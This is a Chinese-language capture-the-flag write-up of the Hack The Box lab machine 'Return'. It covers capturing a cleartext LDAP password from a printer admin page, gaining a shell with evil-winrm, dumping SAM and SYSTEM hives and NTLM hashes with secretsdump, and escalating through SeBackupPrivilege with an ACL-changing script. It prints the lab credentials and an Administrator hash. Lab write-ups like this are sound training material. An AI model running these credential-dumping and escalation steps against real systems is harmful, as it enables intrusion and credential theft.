---
description: Easy / LDAP明文传输 / SeBackupPrivilege提权
---

# ✔️ Return

## 建立立足点

### 信息收集

* 使用Nmap对目标系统进行开放端口扫描：

```bash
nmap -sC -sV -p- -oA return 10.129.95.241 --open
```

<figure><img src="../../.gitbook/assets/1 (32).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/2 (30).png" alt=""><figcaption></figcaption></figure>

* 根据Nmap的输出信息发现目标系统开放了80端口，登录查看是一个打印机的管理员界面：

<figure><img src="../../.gitbook/assets/3 (27).png" alt=""><figcaption></figcaption></figure>

* 使用dirsearch没有找出来什么特别的隐藏文件/目录，在查看settings.php页面发现了域名、端口还有用户名和密码，其中密码部分无法查看：

<figure><img src="../../.gitbook/assets/4 (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/5 (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/6 (29).png" alt=""><figcaption></figcaption></figure>

* 将找到的域名和之前Nmap输出中的域名添加到hosts文件里：

<figure><img src="../../.gitbook/assets/7 (29).png" alt=""><figcaption></figcaption></figure>

* 先尝试使用不同工具进行匿名登录SMB均无收获，enum4linux信息收集也没有什么收获：

<figure><img src="../../.gitbook/assets/8 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/9 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/10 (2) (1).png" alt=""><figcaption></figcaption></figure>

* 回到打印机settings的界面，它设置的端口389是LDAP协议，该打印机是通过LDAP连接到目标域进行身份验证的，这意味着用户svc-printer是一个域内用户账户，且LDAP是明文传输，因此当我们修改目标服务器地址为Kali本机地址时，并在本机做好监听后，即可读取到传输的明文密码内容：

<figure><img src="../../.gitbook/assets/11 (2) (1).png" alt=""><figcaption></figcaption></figure>

* 此时已获得一个有效凭证：<mark style="color:red;">**svc-printer:1edFg43012!!**</mark>&#x20;

### GET SHELL

* 通常当有了一个有效凭证后就可以尝试用evil-winrm来获取shell了（虽然并不总是管用）：

```bash
evil-winrm -i return.local -u svc-printer -p '1edFg43012!!'
```

<figure><img src="../../.gitbook/assets/12 (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/13 (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### 本地信息收集

* 上传winPEAS进行信息收集：

```bash
# evil-winrm
upload /root/Documents/HTB-AD/return/info/winPEASx64.exe
.\winPEASx64.exe
```

<figure><img src="../../.gitbook/assets/14 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 在winPEAS的输出信息中，找到了当前账户的所有的权限中有sebackupprivilege权限，这意味着当前用户在目标系统中有了读取文件和数据的能力。因此，决定从目标系统的SAM中提取高权限用户的哈希，并以此作为登录的凭证：

<figure><img src="../../.gitbook/assets/15 (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/16 (2).png" alt=""><figcaption></figcaption></figure>

### ROOT

* 创建一个/temp目录，并将HKLM的sam.hive和system.hive复制到 /temp目录下并下载：

```bash
# evil-winrm
mkdir C:\temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```

<figure><img src="../../.gitbook/assets/17 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/18 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/19 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 再使用impacket-secretsdump获取NTLM哈希：

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

<figure><img src="../../.gitbook/assets/20 (1) (1).png" alt=""><figcaption></figcaption></figure>

* 最后使用获取到的Administrator账户的哈希，利用evil-winrm进行登录，以为是网络原因登录不成功，但换了时间尝试多次发现该账户应该是不能用hash进行登录：

```bash
evil-winrm -i return.local -u "Administrator" -H "34386a771aaca697f447754e4863d38a"
```

<figure><img src="../../.gitbook/assets/21 (14).png" alt=""><figcaption></figcaption></figure>

* 因此重新搜索关于SeBackupPrivilege的漏洞利用脚本，发现Acl-FullControl.ps1脚本适用于SeBackupPrivilege提权，它是在当前用户的权限下，修改指定路径的访问控制列表(ACL)，给低权限用户添加高权限，赋予它完全的控制权，从而达到提权的效果。
* 该命令将当前的svc-printer用户的访问控制权指向到c:\users\administrator\，执行成功的话就意味着我们对这个目录及其内容有完全控制权：

```powershell
Import-module .\Acl-FullControl.ps1; Acl-FullControl -user svc-printer -path c:\users\administrator\
```

<figure><img src="../../.gitbook/assets/22 (14).png" alt=""><figcaption></figcaption></figure>

* 上传脚本，并执行：

<figure><img src="../../.gitbook/assets/23 (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/24 (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/25 (11).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Get Shell阶段除了常规的枚举之外，还应注意那些最直接的信息。提权阶段锁定漏洞时，有时手动枚举可能会比工具枚举来的更快一些。特别是网络状况不太好时，传输文件会极其的慢。
{% endhint %}
